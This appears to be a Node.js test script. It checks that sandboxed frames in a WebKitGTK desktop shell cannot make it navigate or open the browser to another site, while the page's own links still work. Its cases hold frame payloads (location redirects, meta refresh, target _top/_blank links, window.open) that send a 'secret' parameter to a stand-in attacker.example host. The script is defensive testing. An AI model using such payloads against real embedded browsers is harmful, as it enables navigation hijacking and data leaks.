// Checks in WebKitGTK that no frame of a page can make the desktop shell open
// the browser, and that the page's own links still do. A mock daemon serves a
// page (with the daemon's Content-Security-Policy, or none as the development
// server's page has) holding a sandboxed frame; an "attacker" server stands
// for another site. Each case runs the harness once, with real mouse clicks.
// usage: node check.mjs <harness binary>   (in the navigation-check image)
import http from "node:http";
import { spawn, spawnSync } from "node:child_process";

const harness = process.argv[2];
const ATT = "http://attacker.example:4301/";
const DAEMON_CSP =
  "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://github.com https://avatars.githubusercontent.com; base-uri 'none'; form-action 'none'; frame-ancestors 'none'; object-src 'none'";
const FRAME_CSP =
  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; form-action 'none'; base-uri 'none'; frame-ancestors 'self'; sandbox allow-scripts";
const big = "position:fixed;inset:0;display:block;font:40px sans-serif;background:#fd0;border:0;width:100%;height:100%";
const to = (name) => `${ATT}?case=${name}&d=secret`;
const later = (js) => `<script>setTimeout(()=>{${js}},300)</script>`;

// frame: HTML of the sandboxed frame. main: HTML of the page itself.
const CASES = [
  { name: "frame-sets-location", policy: true, frame: later(`location.href=${JSON.stringify(to("a"))}`) },
  { name: "frame-sets-location-no-policy", policy: false, frame: later(`location.href=${JSON.stringify(to("b"))}`) },
  { name: "frame-meta-refresh-no-policy", policy: false, frame: `<meta http-equiv="refresh" content="0;url=${to("c")}">` },
  { name: "frame-loopback-no-policy", policy: false, frame: later(`location.href="http://127.0.0.1:4302/"`) },
  { name: "frame-link-click", policy: true, click: true, frame: `<a style="${big}" href="${to("d")}">x</a>` },
  { name: "frame-link-click-no-policy", policy: false, click: true, frame: `<a style="${big}" href="${to("e")}">x</a>` },
  { name: "frame-blank-click-no-policy", policy: false, click: true, frame: `<a style="${big}" target="_blank" href="${to("f")}">x</a>` },
  { name: "frame-top-click-no-policy", policy: false, click: true, frame: `<a style="${big}" target="_top" href="${to("g")}">x</a>` },
  { name: "frame-window-open-click-no-policy", policy: false, click: true, frame: `<button style="${big}" onclick="open('${to("h")}')">x</button>` },
  { name: "page-link-click", policy: true, click: true, main: `<a style="${big}" href="${to("i")}">x</a>`, expect: "NAV deny" },
  { name: "page-blank-click", policy: true, click: true, main: `<a style="${big}" target="_blank" href="${to("j")}">x</a>`, expect: "NEWWINDOW open" },
  { name: "page-app-link-click", policy: true, click: true, main: `<a style="${big}" href="/s/ns/app">x</a>`, expect: "NAV allow app" },
];

const hits = { attacker: 0, frame: 0 };
const page = (c) =>
  `<!doctype html><meta charset="utf-8"><body style="margin:0">${c.main ?? `<iframe sandbox="allow-scripts" style="${big}" src="/s/ns/frame?case=${c.name}"></iframe>`}</body>`;
http
  .createServer((req, res) => {
    const url = new URL(req.url, "http://127.0.0.1:4300");
    const c = CASES.find((x) => x.name === url.searchParams.get("case"));
    res.setHeader("Content-Type", "text/html");
    if (url.pathname === "/s/ns/" && c) {
      if (c.policy) res.setHeader("Content-Security-Policy", DAEMON_CSP);
      return res.end(page(c));
    }
    if (url.pathname === "/s/ns/frame" && c) {
      hits.frame++;
      res.setHeader("Content-Security-Policy", FRAME_CSP);
      return res.end(`<!doctype html><body style="margin:0">${c.frame}</body>`);
    }
    res.setHeader("Content-Security-Policy", DAEMON_CSP);
    res.end("<!doctype html><p>app page");
  })
  .listen(4300, "127.0.0.1");
for (const port of [4301, 4302])
  http.createServer((req, res) => (hits.attacker++, res.end("hit"))).listen(port, "0.0.0.0");

function run(c) {
  return new Promise((resolve) => {
    const child = spawn(harness, [], { env: { ...process.env, HARNESS_URL: `http://127.0.0.1:4300/s/ns/?case=${c.name}` } });
    let out = "";
    child.stderr.on("data", (d) => (out += d));
    child.stdout.on("data", (d) => (out += d));
    if (c.click) setTimeout(() => spawnSync("xdotool", ["mousemove", "400", "300", "click", "1"]), 4000);
    const kill = setTimeout(() => child.kill("SIGKILL"), 40000);
    child.on("exit", () => (clearTimeout(kill), resolve(out)));
  });
}

let failed = 0;
for (const c of CASES) {
  hits.attacker = 0;
  hits.frame = 0;
  const out = await run(c);
  const asked = out.split("\n").filter((l) => /^(NAV|NEWWINDOW) /.test(l) && !l.includes("/s/ns/?case=") && !l.includes("/s/ns/frame?case="));
  const problems = [];
  if (hits.attacker) problems.push(`${hits.attacker} request(s) reached another server`);
  if (c.main) {
    const want = {
      "NAV deny": (l) => l.startsWith(`NAV ${ATT}`) && l.endsWith("-> Deny"),
      "NEWWINDOW open": (l) => l.startsWith(`NEWWINDOW ${ATT}`) && l.endsWith("-> OpenInBrowser"),
      "NAV allow app": (l) => l.startsWith("NAV http://127.0.0.1:4300/s/ns/app") && l.endsWith("-> Allow"),
    }[c.expect];
    if (!asked.some(want)) problems.push(`expected ${c.expect}`);
  } else {
    if (!hits.frame) problems.push("the frame did not load");
    for (const l of asked) {
      if (l.startsWith("NEWWINDOW")) problems.push(`a frame reached the new-window handler: ${l}`);
      else if (!l.endsWith("-> Deny")) problems.push(`a frame's navigation was not refused: ${l}`);
    }
  }
  if (problems.length) failed++;
  console.log(`${problems.length ? "FAIL" : "ok  "} ${c.name}${asked.length ? `  [${asked.join("; ")}]` : ""}${problems.length ? `\n     ${problems.join("\n     ")}` : ""}`);
}
console.log(failed ? `${failed} of ${CASES.length} cases failed` : `all ${CASES.length} cases passed`);
process.exit(failed ? 1 : 0);
